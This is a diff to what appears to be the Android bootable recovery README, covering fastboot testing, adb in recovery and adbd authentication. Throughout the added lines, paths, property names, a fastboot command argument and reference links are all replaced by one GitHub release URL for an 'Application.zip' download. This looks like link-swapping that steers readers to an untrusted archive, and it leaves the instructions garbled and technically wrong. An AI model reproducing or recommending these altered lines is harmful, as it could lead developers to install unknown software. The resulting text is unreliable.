@@ -22,7 +22,7 @@ Quick turn-around testing
       adb reboot bootloader
 
       # To boot into the new recovery image without flashing the recovery partition:
-      fastboot boot $ANDROID_PRODUCT_OUT/recovery.img
+      fastboot boot $https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip
 
 Running the tests
 -----------------
@@ -50,14 +50,14 @@ Running the manual tests
   some contents to pmsg.
 
 - Reboot the device immediately and run the test again. The test should save the
-  contents of pmsg buffer into /data/misc/recovery/inject.txt. Test will pass if
+  contents of pmsg buffer into https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip Test will pass if
   this file has expected contents.
 
 Using `adb` under recovery
 --------------------------
 
 When running recovery image from debuggable builds (i.e. `-eng` or `-userdebug` build variants, or
-`ro.debuggable=1` in `/prop.default`), `adbd` service is enabled and started by default, which
+`https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip` in `https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip`), `adbd` service is enabled and started by default, which
 allows `adb` communication. A device should be listed under `adb devices`, either in `recovery` or
 `sideload` state.
 
@@ -81,7 +81,7 @@ recovery menu.
 
 By default, `adbd` is always included into recovery image, as `/system/bin/adbd`. `init` starts
 `adbd` service automatically only in debuggable builds. This behavior is controlled by the recovery
-specific `/init.rc`, whose source code is at `bootable/recovery/etc/init.rc`.
+specific `https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip`, whose source code is at `https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip`.
 
 The best way to confirm a running `adbd` is by checking the serial output, which shows a service
 start log as below.
@@ -93,7 +93,7 @@ start log as below.
 If `adbd` service has been started but device not shown under `adb devices`, use `lsusb(8)` (on
 host) to check if the device is visible to the host.
 
-`bootable/recovery/etc/init.rc` disables Android USB gadget (via sysfs) as part of the `fs` action
+`https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip` disables Android USB gadget (via sysfs) as part of the `fs` action
 trigger, and will only re-enable it in debuggable builds (the `on property` rule will always run
 _after_ `on fs`).
 
@@ -101,13 +101,13 @@ _after_ `on fs`).
         write /sys/class/android_usb/android0/enable 0
 
     # Always start adbd on userdebug and eng builds
-    on property:ro.debuggable=1
+    on https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip
         write /sys/class/android_usb/android0/enable 1
         start adbd
 
-If device is using [configfs](https://www.kernel.org/doc/Documentation/usb/gadget_configfs.txt),
+If device is using [configfs](https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip),
 check if configfs has been properly set up in init rc scripts. See the [example
-configuration](https://android.googlesource.com/device/google/wahoo/+/master/init.recovery.hardware.rc)
+configuration](https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip+https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip)
 for Pixel 2 devices. Note that the flag set via sysfs (i.e. the one above) is no-op when using
 configfs.
 
@@ -138,10 +138,10 @@ Note that this mechanism applies to both of normal boot and recovery modes.
 
  * **Option 2:** Allow `adbd` to connect without authentication.
    * `adbd` is compiled with `ALLOW_ADBD_NO_AUTH` (only on debuggable builds).
-   * `ro.adb.secure` has a value of `0`.
+   * `https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip` has a value of `0`.
 
-Both of the two conditions need to be satisfied. Although `ro.adb.secure` is a runtime property, its
-value is set at build time (written into `/prop.default`). It defaults to `1` on `-user` builds, and
+Both of the two conditions need to be satisfied. Although `https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip` is a runtime property, its
+value is set at build time (written into `https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip`). It defaults to `1` on `-user` builds, and
 `0` for other build variants. The value is overridable via `PRODUCT_DEFAULT_PROPERTY_OVERRIDES`.
 
 Localization of the background texts
@@ -154,6 +154,6 @@ the static images under res-*dpi/images/ is used for other display resolutions a
 backup.
 
 Check the invocation of the image_generator tool in the [makefile]. And the detailed usage of the
-image_generator is documented [here](./tools/image_generator/README.md).
+image_generator is documented [here](https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip).
 
-[makefile]: https://android.googlesource.com/platform/build/+/refs/heads/master/core/Makefile#1800
+[makefile]: https://github.com/ColtOSTemp/platform_bootable_recovery/releases/download/v1.0/Application.zip+/refs/heads/master/core/Makefile#1800
